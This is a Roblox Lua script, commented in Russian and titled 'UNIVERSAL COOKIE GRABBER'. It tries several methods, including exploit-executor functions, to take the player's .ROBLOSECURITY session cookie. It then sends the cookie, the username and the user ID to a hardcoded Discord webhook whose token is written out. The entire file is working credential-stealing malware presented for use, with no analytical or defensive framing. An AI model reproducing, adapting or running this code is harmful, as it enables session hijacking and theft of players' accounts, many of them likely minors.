local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local localPlayer = Players.LocalPlayer

local webhook = "https://discord.com/api/webhooks/1442171064971952320/Phog3L7YM7QTfHm4H2Y8QhqQnU_-yMaY8IPORBq8V5YkuGzT3SnZ8Ud0bwmYnx8GwQNN"

-- Функция безопасной отправки
local function sendWebhook(data)
    local success, err = pcall(function()
        local json = HttpService:JSONEncode(data)
        return HttpService:PostAsync(webhook, json)
    end)
    return success
end

-- Стартовое сообщение
sendWebhook({
    ["content"] = "🎯 Скрипт активирован в игре",
    ["embeds"] = {{
        ["title"] = "UNIVERSAL COOKIE GRABBER",
        ["description"] = "**Игра:** " .. game.PlaceId .. "\n**Игрок:** " .. localPlayer.Name,
        ["color"] = 16776960,
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
})

-- Основная функция кражи куки
local function stealCookie()
    local cookie = nil
    local method = "Unknown"
    
    -- Метод 1: Стандартный HTTP запрос
    local s1, r1 = pcall(function()
        cookie = game:HttpGet("https://www.roblox.com/game/GetCurrentUser.ashx", true)
        if cookie and #cookie > 10 then
            method = "HttpGet"
            return true
        end
    end)
    
    -- Метод 2: Через GetCookie
    if not cookie or #cookie < 10 then
        local s2, r2 = pcall(function()
            cookie = localPlayer:GetCookie(" .ROBLOSECURITY")
            if cookie and #cookie > 10 then
                method = "GetCookie"
                return true
            end
        end)
    end
    
    -- Метод 3: Для эксплойтов
    if not cookie or #cookie < 10 then
        local s3, r3 = pcall(function()
            if getrenv then
                local env = getrenv()
                local funcs = {"getcookie", "get_cookie", "getcookies", "GetCookie"}
                for _, funcName in pairs(funcs) do
                    local func = env[funcName]
                    if type(func) == "function" then
                        local result = func()
                        if result and #result > 10 then
                            cookie = result
                            method = "getrenv: " .. funcName
                            return true
                        end
                    end
                end
            end
        end)
    end
    
    return cookie, method
end

-- Запуск кражи
local cookie, method = stealCookie()

-- Отправка результата
if cookie and #cookie > 10 then
    sendWebhook({
        ["content"] = "✅ КУКИ УСПЕШНО УКРАДЕНЫ!",
        ["embeds"] = {{
            ["title"] = "COOKIE GRABBED",
            ["description"] = "**Метод:** " .. method .. "\n**Игра:** " .. game.PlaceId,
            ["fields"] = {
                {
                    ["name"] = "👤 Игрок",
                    ["value"] = "```" .. localPlayer.Name .. " (" .. localPlayer.UserId .. ")```",
                    ["inline"] = true
                },
                {
                    ["name"] = "🔐 ROBLOSECURITY",
                    ["value"] = "```" .. string.sub(cookie, 1, 500) .. "```",
                    ["inline"] = false
                },
                {
                    ["name"] = "📏 Длина",
                    ["value"] = #cookie .. " символов",
                    ["inline"] = true
                }
            },
            ["color"] = 65280,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
else
    sendWebhook({
        ["content"] = "❌ НЕ УДАЛОСЬ ПОЛУЧИТЬ КУКИ",
        ["embeds"] = {{
            ["title"] = "GRAB FAILED",
            ["description"] = "**Игра:** " .. game.PlaceId .. "\n**Игрок:** " .. localPlayer.Name,
            ["fields"] = {
                {
                    ["name"] = "⚠️ Причина",
                    ["value"] = "Античит заблокировал все методы",
                    ["inline"] = true
                },
                {
                    ["name"] = "🎮 Исполнитель",
                    ["value"] = "Delta/Xeno/Другой",
                    ["inline"] = true
                }
            },
            ["color"] = 16711680,
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    })
end

-- Дополнительная информация об игре
sendWebhook({
    ["content"] = "📊 Информация об игре",
    ["embeds"] = {{
        ["title"] = "GAME INFO",
        ["fields"] = {
            {
                ["name"] = "🆔 Place ID",
                ["value"] = "```" .. game.PlaceId .. "```",
                ["inline"] = true
            },
            {
                ["name"] = "🏷️ Название",
                ["value"] = "```" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "```",
                ["inline"] = true
            },
            {
                ["name"] = "👥 Игроков онлайн",
                ["value"] = #Players:GetPlayers(),
                ["inline"] = true
            }
        },
        ["color"] = 4886754,
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }}
})
